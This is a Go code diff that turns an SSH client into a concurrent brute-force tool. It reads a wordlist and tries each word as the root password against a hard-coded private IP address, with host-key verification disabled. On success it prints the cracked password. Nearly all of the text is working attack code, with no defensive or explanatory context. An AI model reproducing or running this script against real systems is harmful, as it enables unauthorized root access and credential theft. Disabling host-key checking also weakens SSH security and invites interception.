@@ -4,11 +4,18 @@ import (
 	"bufio"
 	"fmt"
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/crypto/ssh/knownhosts"
+
 	"os"
+	"sync"
 
 	"log"
 )
+
+const LIMIT = 10
+
+var done = make(chan bool)
+
+var throttler = make(chan int, LIMIT)
 
 func readFile(f string) (data []string, err error) {
 	b, err := os.Open(f)
@@ -22,27 +29,31 @@ func readFile(f string) (data []string, err error) {
 	}
 	return data, err
 }
-
-func main() {
-	hostKeyCallback, err := knownhosts.New("/home/beriflapp/.ssh/known_hosts")
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	config := &ssh.ClientConfig{
-		User: username,
+func connect(wg *sync.WaitGroup, password string) {
+	defer wg.Done()
+	sshConfig := &ssh.ClientConfig{
+		User: "root",
 		Auth: []ssh.AuthMethod{
 			ssh.Password(password),
 		},
-		HostKeyCallback: hostKeyCallback,
-	}
 
-	conn, errCon := ssh.Dial("tcp", host+":22", config)
-	if errCon != nil {
-		log.Fatal("unable to connect: ", errCon)
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
-	fmt.Println("access")
-	defer conn.Close()
+	sshConfig.SetDefaults()
+	c, err := ssh.Dial("tcp", "192.168.100.145:22", sshConfig)
+	if err != nil {
+		<-throttler
+		return
+	}
+	defer c.Close()
+	fmt.Printf("Passage granted ! : root password is : %s\n", password)
+	done <- true
+	<-throttler
+
+}
+
+func main() {
+	var wg sync.WaitGroup
 
 	passwords, err := readFile("/home/beriflapp/rootPass/words_alpha.txt")
 	if err != nil {
@@ -51,7 +62,17 @@ func main() {
 	}
 
 	for _, pass := range passwords {
-		fmt.Println(pass)
+		select {
+		case <-done:
+			return
+		default:
+			throttler <- 0
+			wg.Add(1)
+			fmt.Println(pass)
+			go connect(&wg, pass)
+		}
+
 	}
+	wg.Wait()
 
 }
